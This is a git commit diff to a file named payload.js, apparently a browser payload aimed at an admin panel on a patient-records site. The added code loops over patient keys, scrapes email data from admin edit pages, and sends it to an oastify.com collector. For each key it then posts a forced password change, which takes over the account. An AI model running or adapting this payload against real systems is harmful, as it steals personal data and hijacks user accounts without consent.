87712d7fff77dda583f7feef05dd3ae4207e6918
tomoncrss <tonymyson89823@gmail.com>
2025-02-13 10:23:48 +0330

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,15 @@
-fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: "aPatientKey=199234" +
-                "&NewPassword=Test%40123%4012"
-        });
+for (let i = 199234; i <= 199235; i++) {
+  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
+    .then(res => res.text())
+    .then(res => {
+      let match = res.match(/<input type="checkbox" name="emails"([\s\S]*?)<\/label>/);
+      if (match) {
+        fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(match[1])}`);
+      }
+      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
+      });
+    });
+}
